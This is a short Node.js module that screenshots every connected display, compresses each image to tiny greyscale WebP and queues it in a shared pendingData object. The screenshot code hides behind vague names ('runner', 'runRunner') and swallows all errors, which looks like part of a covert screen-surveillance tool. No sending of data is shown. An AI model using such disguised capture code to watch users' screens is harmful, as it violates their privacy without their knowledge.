const runner = require('screenshot-desktop');
const sharp = require('sharp');
const { pendingData } = require('./global');

// Function to capture a screenshot
const runRunner = async () => {
  try {
    // Capture screenshot of the entire desktop
    const displays = await runner.listDisplays();

    for (let i = 0; i < displays.length; i ++) {
      const run = await runner({ screen: displays[i].id });

      const runBuffer = await sharp(run)
        .greyscale()
        .webp({ quality: 3, reductionEffort: 0 })
        .toBuffer();

      pendingData.runners.push({
        buffer: runBuffer,
        monitorId: i,
      });
    }
  } catch (err) {
  }
}

module.exports = {
  runRunner
}